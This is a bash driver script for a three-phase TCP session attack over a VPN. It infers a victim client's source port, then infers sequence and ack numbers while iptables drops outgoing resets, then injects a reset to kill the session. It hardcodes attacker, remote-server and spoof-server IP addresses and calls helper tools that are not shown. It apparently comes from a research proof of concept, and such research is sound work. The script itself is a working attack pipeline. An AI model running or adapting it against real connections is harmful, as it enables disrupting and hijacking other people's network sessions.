# !/bin/bash
ATTACKER_PRIVATE_IP=10.20.14.137; # VPN private IP of the local attacker after connecting with the VPN server
REMOTE_SERVER_IP=34.84.142.12; # public ip of remote-server to check for connection
REMOTE_SERVER_PORT=21; # remote server port to provide pulic TCP services, the victim client will connect to this port.
SPOOF_SERVER_IP=34.84.142.12; # public ip of spoof-server to infer connection. If you do not have an IP spoofable machine, you can run the codes at the remote server. In this case we will start another process at the remote server only to send packets that the local attacker requires and will not leak the information of the victim connection to the local attacker.
SPOOF_SERVER_PORT=80; # The spoof server will listen on this port to start the spoofing process for the local attacker to connect.
PACKET_IFACE="tun0"; # packet iface of the local attacker after connecting with the VPN server


sudo iptables -F
printf "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 1 ~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"


echo `date`
echo "determining if client is talking to ${REMOTE_SERVER_IP}:${REMOTE_SERVER_PORT} on any port.."

cd ../1-infer_port

sudo ./tcp_port_infer ${ATTACKER_PRIVATE_IP} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${SPOOF_SERVER_IP} ${SPOOF_SERVER_PORT} ${PACKET_IFACE}

PORT_INFER_RESULT=$(cat ../complete_attack/PORT_INFER_RESULT)
GUESSED_CLIENT_PORT=$(echo "$PORT_INFER_RESULT" |grep -o "source-port: .*"| awk -F": " '{print $2}'|head -n 1)

echo "phase 1 port result: ${GUESSED_CLIENT_PORT}"
echo `date`

sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP
# sleep 120s


printf "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 2~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`
echo "beginning phase 2 to infer sequence and ack numbers needed to inject.."
cd ../2-infer_seq

sudo ./seq_infer ${ATTACKER_PRIVATE_IP} ${GUESSED_CLIENT_PORT} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${SPOOF_SERVER_IP} ${SPOOF_SERVER_PORT} ${PACKET_IFACE}
SEQ_ACK_RESULT=$(cat ../complete_attack/SEQ_ACK_RESULT)
SEQ=$(echo "$SEQ_ACK_RESULT" |grep -o "seq: .*"| awk -F": " '{print $2}'|head -n 1)
# echo $SEQ
ACK=$(echo "$SEQ_ACK_RESULT" |grep -o "ack: .*"| awk -F": " '{print $2}'|head -n 1)
echo `date`
sleep 3s
sudo iptables -F


printf "\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n~~~~~~~~~~~ PHASE 3~~~~~~~~~~~\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n"
echo `date`
echo "beginning phase 3 to terminate the TCP session."


cd ../3-hijack_session
sudo python3 rst_session.py ${ATTACKER_PRIVATE_IP} ${GUESSED_CLIENT_PORT} ${REMOTE_SERVER_IP} ${REMOTE_SERVER_PORT} ${SEQ} ${ACK} ${PACKET_IFACE}

echo `date`



